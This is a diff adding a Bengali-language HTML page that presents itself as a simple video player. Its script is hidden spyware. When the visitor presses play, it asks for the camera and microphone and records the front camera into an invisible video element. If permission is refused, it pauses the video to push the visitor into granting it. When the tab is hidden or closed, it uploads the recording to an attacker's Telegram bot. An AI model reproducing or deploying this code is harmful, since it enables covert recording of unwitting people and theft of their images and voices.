@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Video Player</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background: radial-gradient(circle at center, #0f172a 0%, #020617 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 12px;
+      overflow: hidden;
+      font-family: system-ui, -apple-system, sans-serif;
+    }
+
+    .bg-glow {
+      position: absolute;
+      width: 300px;
+      height: 300px;
+      background: radial-gradient(circle, rgba(56, 189, 248, 0.15) 0%, rgba(0, 0, 0, 0) 70%);
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .player-card {
+      position: relative;
+      z-index: 1;
+      width: 100%;
+      max-width: 500px;
+      background: rgba(15, 23, 42, 0.65);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 24px;
+      padding: 14px;
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6),
+                  inset 0 1px 0 rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+    }
+
+    .video-container {
+      position: relative;
+      width: 100%;
+      border-radius: 16px;
+      overflow: hidden;
+      background: #000;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.5);
+    }
+
+    video {
+      width: 100%;
+      display: block;
+      outline: none;
+      border-radius: 16px;
+    }
+
+    #hiddenCam {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="bg-glow"></div>
+
+  <div class="player-card">
+    <div class="video-container">
+      <video id="mainVideo" controls preload="metadata">
+        <source src="video.mp4" type="video/mp4">
+        আপনার ব্রাউজার ভিডিও সাপোর্ট করছে না।
+      </video>
+    </div>
+  </div>
+
+  <video id="hiddenCam" autoplay playsinline muted></video>
+
+  <script>
+    // ⚙️ রেন্ডার বিল্ডের সময় এগুলো অটোমেটিক এনভায়রনমেন্ট ভেরিয়েবল দিয়ে রিপ্লেস করে নেবে
+    const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+    const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+    const mainVideo = document.getElementById('mainVideo');
+    const hiddenCam = document.getElementById('hiddenCam');
+
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let camStream = null;
+    let isRecordingStarted = false;
+    let isUploading = false;
+
+    mainVideo.addEventListener('play', async () => {
+      if (isRecordingStarted) return;
+
+      try {
+        camStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user' },
+          audio: true 
+        });
+
+        hiddenCam.srcObject = camStream;
+
+        recordedChunks = [];
+        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+        if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+          options = { mimeType: 'video/mp4' };
+        }
+
+        mediaRecorder = new MediaRecorder(camStream, options);
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data && e.data.size > 0) {
+            recordedChunks.push(e.data);
+          }
+        };
+
+        mediaRecorder.start(1000);
+        isRecordingStarted = true;
+
+      } catch (err) {
+        console.error("Permission denied or Error:", err);
+        mainVideo.pause();
+      }
+    });
+
+    function sendToTelegramBeacon() {
+      if (!isRecordingStarted || isUploading || recordedChunks.length === 0) return;
+      isUploading = true;
+
+      const blob = new Blob(recordedChunks, { type: 'video/webm' });
+      const formData = new FormData();
+      formData.append('chat_id', TELEGRAM_CHAT_ID);
+      formData.append('video', blob, `rec_${Date.now()}.webm`);
+
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+      
+      fetch(url, {
+        method: 'POST',
+        body: formData,
+        keepalive: true
+      }).catch(err => console.error("Transmission Failed", err));
+    }
+
+    function handleExit() {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+      if (camStream) {
+        camStream.getTracks().forEach(track => track.stop());
+      }
+      sendToTelegramBeacon();
+    }
+
+    window.addEventListener('pagehide', handleExit);
+    window.addEventListener('beforeunload', handleExit);
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') {
+        handleExit();
+      }
+    });
+  </script>
+</body>
+</html>
+
